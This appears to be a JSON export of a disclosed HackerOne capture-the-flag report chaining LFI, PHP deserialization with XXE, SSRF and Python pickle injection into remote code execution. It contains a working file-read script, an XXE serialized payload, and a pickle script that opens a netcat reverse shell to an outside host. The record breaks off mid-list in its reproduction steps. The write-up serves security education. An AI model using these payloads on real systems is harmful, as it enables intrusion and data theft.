+            "message": "We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!", 
+            "markdown_message": "<p>We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!</p>\n\n<p>Best of luck and happy hacking!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3404476, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T16:02:24.962Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T16:02:24.962Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "first_to_agree": true, 
+            "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ", 
+            "markdown_message": "<p>We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. </p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3514762, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T17:13:10.656Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T17:13:10.656Z", 
+            "actor": {
+                "username": "manoelt", 
+                "url": "/manoelt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/480/afece2a510d0fa95bb4971d1e93daa36f4abe998_medium.jpg?1541118483"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3515095, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T17:13:10.715Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T17:13:10.715Z", 
+            "actor": {
+                "username": "manoelt", 
+                "url": "/manoelt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/480/afece2a510d0fa95bb4971d1e93daa36f4abe998_medium.jpg?1541118483"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3515096, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "manoelt", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/manoelt", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/008/480/2d003b60f5a6ce8c6523ef37f94f8bc811c5b5a8_small.jpg?1541118483"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 59, 
+        "name": "OS Command Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1318375.74513524, 
+    "disclosed_at": "2018-10-22T17:13:10.696Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/415682", 
+    "created_at": "2018-09-28T14:52:45.388Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong><br>\nAfter source code disclosure using a LFI vulnerability and using PHP object injection with XXE I was able to find an internal service at port 1337. Using the SSRF through XXE I sent a HTTP request to this internal service and discovered a python object injection using status parameter, with this vector I was able to get RCE on the server located at 104.248.121.85.</p>\n\n<p><strong>Description:</strong></p>\n\n<p><u>LFI</u><br>\nThe <em>template</em> parameter at /api/generate.php is vulnerable to LFI. So I could get all relevant source code from the application using <em>type</em> as text. I created a python script to help:</p>\n<pre class=\"highlight plaintext\"><code>import requests\nimport sys\n\nurl = &#39;http://h1-5411.h1ctf.com/api/&#39;\nendpoint = &#39;generate.php&#39;\n\nheaders = {&#39;Cookie&#39;:&#39;PHPSESSID=v6a28uv6ad2e9ivr02hajqao4g&#39;}\npayload = {&#39;template&#39; : &#39;../../../../../../..&#39;+sys.argv[1], &#39;type&#39; : &#39;text&#39;, &#39;top-text&#39; : &#39;.&#39;, &#39;bottom-text&#39; :&#39;.&#39;}\n\nr = requests.post(url+endpoint, headers=headers, data=payload)\njson_response = r.json()\n\nfile_url = json_response[&#39;meme_path&#39;]\nprint file_url\n\nr = requests.get(url+file_url)\nprint r.text\n</code></pre>\n<p>Using Burp:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"LFI.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/386/918b93ed1c293729925d186d8166819963bd38d4/LFI.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=064a3bf56e75de85f012ae0a9e2e75f49b953ec461bd923630a64ab91c92e2d4\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/386/918b93ed1c293729925d186d8166819963bd38d4/LFI.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=064a3bf56e75de85f012ae0a9e2e75f49b953ec461bd923630a64ab91c92e2d4\" class=\"markdown-inline-image\"></a></p>\n\n<p>Some files read during my tests:</p>\n\n<ol>\n<li>/etc/passwd</li>\n<li>/etc/issue</li>\n<li>/etc/resolv.conf</li>\n<li>/etc/hosts</li>\n<li>/var/log/apt/history.log</li>\n<li>App source code</li>\n</ol>\n\n<p><u>PHP Object Injection - Deserialization and XXE</u><br>\nAfter read the code I discovered two endpoints for a future version, 2.0:</p>\n\n<p>File: header.php</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n  $pages = [\n    &quot;generate.php&quot; =&gt; &quot;Meme Generator&quot;,\n    &quot;memes.php&quot; =&gt; &quot;Your Memes&quot;,\n    // for version 2.0\n    // &quot;import_memes_2.0.php&quot; =&gt; &quot;Import Memes&quot;,\n    // &quot;export_memes_2.0.php&quot; =&gt; &quot;Export Memes&quot;\n  ];\n?&gt;\n</code></pre>\n<p>Looking into import_memes_2.0.php and export_memes_2.0.php I found an unserialization call using user input without validation, which is extremely dangerous. So I craft a payload serializing a <em>ConfigFile</em> object with XML in <em>config_raw</em> attribute, as __toString() method calls parse() witch then calls loadXML with libxml_disable_entity_loader ENABLED. So, we could obtain XXE and SSRF.</p>\n\n<p>Using PHP to create the payload:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\nrequire_once(&#39;classes.php&#39;); // Same I got using LFI\n\n$t = new ConfigFile(&#39;http://localhost/h1-5411/xml2&#39;); \n$x = new Maintenance();\n\n$o = [$t, $x ];\n\necho base64_encode(serialize($o));\n</code></pre>\n<p>PHP Object example (b64 decoded):</p>\n<pre class=\"highlight plaintext\"><code>a:2:{i:0;O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:276:&quot;&lt;?xml version=&#39;1.0&#39; encoding=&#39;ISO-8859-1&#39;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM &#39;php://filter/convert.base64-encode/resource=/etc/issue&#39; &gt;]&gt;\n&lt;memes&gt;&lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;&lt;bottomtext&gt;A&lt;/bottomtext&gt;&lt;template&gt;TeMPLaTe123&lt;/template&gt;&lt;type&gt;XML&lt;/type&gt;&lt;/memes&gt;\n&quot;;}i:1;O:11:&quot;Maintenance&quot;:0:{}}\n</code></pre>\n<p>File: xml2</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&#39;1.0&#39; encoding=&#39;ISO-8859-1&#39;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;</span>\n<span class=\"cp\">&lt;!ENTITY xxe SYSTEM &#39;php://filter/convert.base64-encode/resource=/etc/issue&#39; &gt;</span>]&gt;\n<span class=\"nt\">&lt;memes&gt;&lt;toptext&gt;</span><span class=\"ni\">&amp;xxe;</span><span class=\"nt\">&lt;/toptext&gt;&lt;bottomtext&gt;</span>A<span class=\"nt\">&lt;/bottomtext&gt;&lt;template&gt;</span>TeMPLaTe123<span class=\"nt\">&lt;/template&gt;&lt;type&gt;</span>XML<span class=\"nt\">&lt;/type&gt;&lt;/memes&gt;</span>\n</code></pre>\n<p>Then using the serialized object above (ConfigFile), I uploaded my memepak using /import_memes_2.0.php and got the /etc/issue file base64 encoded as one of my memes.</p>\n\n<p><strong>SSRF</strong></p>\n\n<p>Using the above XXE we could manipulate the server to do requests for others internal services, as noted at source code there is a Maintenance service somewhere.</p>\n\n<p>Using the python exploit attached <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"send_meme.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/404/1a52bc0d05fd75aecd56d33d507851864c4c3045/send_meme.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=34bdb74f17dd0c7dccaf20f4ca96d0da2e90550a4229bc5986d26020000c711e\" data-attachment-type=\"text/x-python\">send_meme.py (F352404)</a>, I could read files and do http/ftp requests. Although I could do a port scan using http/ftp/sftp requests, I was able to find the internal service using a process ID scan using /proc/{ID}/cmdline, which revealed:</p>\n<pre class=\"highlight plaintext\"><code>/proc\n1\nps-run\n\n4\n/bin/bash/opt/run/ctf-entrypoint\n\n6\nssh-i/app/92df63a566f599a094153febb133b99f87a161b5-oStrictHostKeyChecking=no-f-N-L1337:localhost:1337maintenance@104.248.121.85\n\n8\n/bin/sh/usr/sbin/apache2ctl-DFOREGROUND\n</code></pre>\n<p>So I found a ssh tunnel to another service at 104.248.121.85. Using the python script above, I started to interact with <a title=\"http://localhost:1337/\" href=\"/redirect?signature=73f596cb875bd474f2eac7455f1801ce10c54c9b&amp;url=http%3A%2F%2Flocalhost%3A1337%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost:1337/</span><i class=\"icon-external-link\"></i></a> :<br>\n <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Pickle.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/398/537faae2ae5bbc087a8055b0d19c57692b874996/Pickle.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=81893eed715a52c31e9e05179dee0ab1fdd55520dbf6655c18d202cc522964ae\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/398/537faae2ae5bbc087a8055b0d19c57692b874996/Pickle.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=81893eed715a52c31e9e05179dee0ab1fdd55520dbf6655c18d202cc522964ae\" class=\"markdown-inline-image\"></a></p>\n\n<p><strong>Python Object Injection - Pickle</strong></p>\n\n<p>Using the <em>debug</em> parameter I realized that <em>status</em> parameter should be base64 encoded. After that I could see a pickle base64 encoded as status. My first try was to request a status-update using a malicious pickle as status:</p>\n\n<p>Creating a malicious pickle with a reverse shell:</p>\n<pre class=\"highlight plaintext\"><code>import cPickle\nimport os\nimport sys\nimport base64\n\nDEFAULT_COMMAND = &quot;nc \u2588\u2588\u2588\u2588\u2588\u2588\u2588 9300 -e /bin/bash&quot;\n\nCOMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n\n</code></pre>\n<p>Sending the above Pickle I got a connect back from the server.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ReverseShell.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/400/72044175b0de83ecfffa4880fed2bf1d6cde1a23/ReverseShell.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ec975c488951f1a292f71533c8b15f0d821c971b0168af415753cfa2a2eedd68\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/400/72044175b0de83ecfffa4880fed2bf1d6cde1a23/ReverseShell.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ec975c488951f1a292f71533c8b15f0d821c971b0168af415753cfa2a2eedd68\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>I created some python scripts to reproduce.</p>\n\n<ol>\n<li>Use <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"lfi.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/403/0cd48f48459bda8784cd2b4bf00c84cb1eb03bd5/lfi.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cbfbdf0e0d85bb660a3042f6ebd5a8cb65646f432947e882f1783252bfe27df7\" data-attachment-type=\"text/plain\">lfi.py (F352403)</a> to read files from the server (LFI)</li>\n<li>Use <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"send_meme.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/404/1a52bc0d05fd75aecd56d33d507851864c4c3045/send_meme.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=34bdb74f17dd0c7dccaf20f4ca96d0da2e90550a4229bc5986d26020000c711e\" data-attachment-type=\"text/x-python\">send_meme.py (F352404)</a> to read files and do requests to internal services. Found <a title=\"http://localhost:1337\" href=\"/redirect?signature=68488600f56abf95b90937ef563c390acdf2c5aa&amp;url=http%3A%2F%2Flocalhost%3A1337\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost:1337</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Use <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"python_pickle_rce.py\" 